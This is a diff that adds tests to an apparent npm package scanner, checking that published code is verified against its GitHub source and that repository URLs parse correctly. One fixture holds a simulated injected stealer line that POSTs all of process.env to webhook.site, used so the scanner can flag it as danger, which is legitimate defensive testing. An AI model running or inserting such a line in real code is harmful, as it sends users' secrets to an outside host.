@@ -129,3 +129,50 @@ test('live: catches the Sept 2025 chalk hijack and npm takedowns', { skip: !proc
   assert.equal(v.lodahs, 'danger');
   assert.equal(v.express, 'safe');
 });
+
+import { verifyAgainstSource, githubRepo } from '../dist/core/index.js';
+
+function fakeGithub(files) {
+  const real = globalThis.fetch;
+  globalThis.fetch = async (url) => {
+    const m = /raw\.githubusercontent\.com\/acme\/lib\/abc1234def\/(.*)$/.exec(String(url));
+    if (m && m[1] in files) return new Response(files[m[1]], { status: 200 });
+    return new Response('not found', { status: 404 });
+  };
+  return () => (globalThis.fetch = real);
+}
+const manifest = { name: 'lib', version: '1.0.1', gitHead: 'abc1234def', main: 'index.js', repository: { url: 'git+https://github.com/acme/lib.git' } };
+
+test('source check: identical release is verified', async () => {
+  const restore = fakeGithub({ 'package.json': '{"name":"lib"}', 'index.js': 'module.exports = 1;\n' });
+  try {
+    const { check, findings } = await verifyAgainstSource(manifest, [{ path: 'index.js', size: 20, text: 'module.exports = 1;' }]);
+    assert.equal(check.status, 'verified');
+    assert.equal(findings[0].code, 'source-verified');
+  } finally { restore(); }
+});
+
+test('source check: injected stealer that is not in git is danger, with the lines shown', async () => {
+  const restore = fakeGithub({ 'package.json': '{"name":"lib"}', 'index.js': 'module.exports = 1;\n' });
+  try {
+    const published = "module.exports = 1;\nfetch('https://webhook.site/x', { method: 'POST', body: JSON.stringify(process.env) });";
+    const { check, findings } = await verifyAgainstSource(manifest, [{ path: 'index.js', size: 99, text: published }]);
+    assert.equal(check.status, 'differs');
+    assert.equal(findings[0].severity, 'danger');
+    assert.ok(findings[0].evidence.some((e) => e.includes('webhook.site')));
+  } finally { restore(); }
+});
+
+test('source check: commit missing from the repo is flagged', async () => {
+  const restore = fakeGithub({});
+  try {
+    const { check } = await verifyAgainstSource(manifest, [{ path: 'index.js', size: 1, text: 'x' }]);
+    assert.equal(check.status, 'commit-missing');
+  } finally { restore(); }
+});
+
+test('github repo parsing', () => {
+  assert.deepEqual(githubRepo({ repository: 'git://github.com/debug-js/debug.git' }), { owner: 'debug-js', repo: 'debug', dir: '' });
+  assert.deepEqual(githubRepo({ repository: { url: 'https://github.com/a/b', directory: 'packages/x' } }), { owner: 'a', repo: 'b', dir: 'packages/x' });
+  assert.equal(githubRepo({ repository: 'https://gitlab.com/a/b' }), null);
+});
